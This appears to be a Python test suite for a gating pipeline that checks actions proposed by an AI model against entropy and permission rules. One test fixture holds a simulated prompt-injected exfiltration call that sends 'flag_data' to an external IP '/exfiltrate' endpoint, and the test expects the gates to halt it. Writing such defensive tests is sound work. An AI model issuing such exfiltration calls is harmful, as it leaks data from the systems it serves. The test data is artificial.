"""
Integration test suite for the EpistemicOrchestrator unified pipeline.

Validates:
1. Adversarial breakout prevention (ADV-CTF-004)
2. Downstream Scope Locking & RMM Subnet Quarantine
3. EntropyAwareScheduler gamma sweeps and noisy payload handling
4. Tamper-evident audit trail integrity
"""

import json
from pathlib import Path
from typing import Dict, Any, List
import pytest

from epistemicos.core import EpistemicOrchestrator
from epistemicos.models import CanonicalProblemRepresentation, PermissionScope
from epistemicos.gates import GateAction
from epistemicos.audit import TamperEvidentAuditTrail, AuditLogLevel


# =====================================================================
# PART 1: ADV-CTF-004 & DOWNSTREAM SCOPE LOCKS
# =====================================================================

def test_ctf_sandbox_breakout_blocked():
    """
    Validates ADV-CTF-004: Ensures prompt-injected exfiltration attempts to external IPs
    trigger both EntropyGate and PermissionGate vetoes, resulting in a HALTED/ROLLED_BACK receipt.
    """
    orchestrator = EpistemicOrchestrator()

    mock_payload = {
        "policy_id": "POL-2026-CTF",
        "primary_metric": 0.0,
        "risk_details": {"sandbox_escape": "Attempting external connectback"}
    }

    context = {
        "token_count": 9,
        # High surprisal logprob trace simulating adversarial model rationalization
        "token_logprobs": [-0.01, -0.05, -12.4, -14.2, -10.5, -9.8, -13.1, -15.5, -0.01],
        "proposed_actions": [
            {
                "op": "api_call",
                "endpoint": "http://198.51.100.44/exfiltrate",
                "data": "flag_data"
            }
        ]
    }

    result = orchestrator.process_submission(mock_payload, context)

    assert result["status"] == "HALTED"
    assert result["gate"] in ("EntropyGate", "PermissionGate")


def test_internal_subnet_mutating_action_permitted():
    """
    Validates that state-mutating requests ('update_db') originating from 
    trusted internal subnets pass scope checks and commit successfully.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="192.168.1.50",
        is_rmm_origin=False,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "ALLOWED"


def test_rmm_quarantine_subnet_mutating_action_blocked():
    """
    Validates that state-mutating requests ('update_db') originating from 
    an RMM quarantine subnet trigger Downstream Scope Lock and halt execution.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="10.240.1.100",
        is_rmm_origin=True,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "HALTED"
    assert result["gate"] == "PermissionGate"


def test_rmm_quarantine_subnet_read_only_permitted():
    """
    Validates that read-only diagnostic requests ('read') originating from 
    an RMM quarantine subnet remain permitted under the degraded privilege profile.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="10.240.1.100",
        is_rmm_origin=True,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "read", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "ALLOWED"


# =====================================================================
# PART 2: NOISY PAYLOADS, ENTROPY SCHEDULING, & AUDIT INTEGRITY
# =====================================================================

def test_orchestrator_noisy_surprisal_halt_and_rollback():
    """
    Validates that high logprob surprisal triggers EntropyGate veto
    and stops execution safely within the unified orchestrator.
    """
    orchestrator = EpistemicOrchestrator()

    mock_commercial_payload = {
        "policy_id": "POL-2026-N99",
        "fleet_data": {
            "vehicle_count": 85,
            "operating_radius_miles": 1200.0,
            "loss_modifier": 1.45,
            "hazard_class": "severe",
            "garaging_states": ["TX", "CA", "AZ"]
        }
    }

    # Deterministic baseline logprobs followed by extreme noise spike
    deterministic_baseline = [-0.05] * 20
    noisy_logprobs = deterministic_baseline + [-12.5, -15.0, -11.8]

    context = {
        "token_count": len(noisy_logprobs),
        "token_logprobs": noisy_logprobs,
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"},
            {"op": "issue_binder", "policy": "POL-2026-N99"}
        ]
    }

    result = orchestrator.process_submission(mock_commercial_payload, context)

    assert result["status"] == "HALTED"
    assert result["gate"] == "EntropyGate"


def test_orchestrator_clean_logprobs_committed():
    """Validates that nominal logprobs without surprisal spikes commit successfully."""
    orchestrator = EpistemicOrchestrator()

    mock_commercial_payload = {
        "policy_id": "POL-2026-N99",
        "fleet_data": {
            "vehicle_count": 85,
            "operating_radius_miles": 1200.0,
            "loss_modifier": 1.45,
            "hazard_class": "severe",
            "garaging_states": ["TX", "CA", "AZ"]
        }
    }

    clean_logprobs = [-0.02] * 25
    context = {
        "token_count": len(clean_logprobs),
        "token_logprobs": clean_logprobs
    }

    result = orchestrator.process_submission(mock_commercial_payload, context)
    assert result["status"] == "ALLOWED"


def test_optimal_gamma_audit_payload(tmp_path):
    """
    Verifies that tamper-evident audit logs record events accurately across execution steps.
    """
    log_file = tmp_path / "test_audit.jsonl"
    audit_logger = TamperEvidentAuditTrail(str(log_file))

    # Record sample trace events to check chain and logging structure
    audit_logger.record_event(
        event_type=AuditLogLevel.INFO,
        gate_name="EntropyAwareScheduler",
        reason="Step passed entropy evaluation",
        model_id="mock-llm-v1",
        payload_snippet="Step 0 distribution"
    )
    
    audit_logger.record_event(
        event_type=AuditLogLevel.HALT,
        gate_name="EntropyAwareScheduler",
        reason="Cumulative entropy shock exceeded gamma threshold",
        model_id="mock-llm-v1",
        payload_snippet="Step 2 distribution",
        metadata={"gamma": 0.80, "drop_bits": 0.9165}
    )

    is_valid, count, error = audit_logger.verify_chain_integrity()
    assert is_valid is True
    assert count == 2
    assert error is None
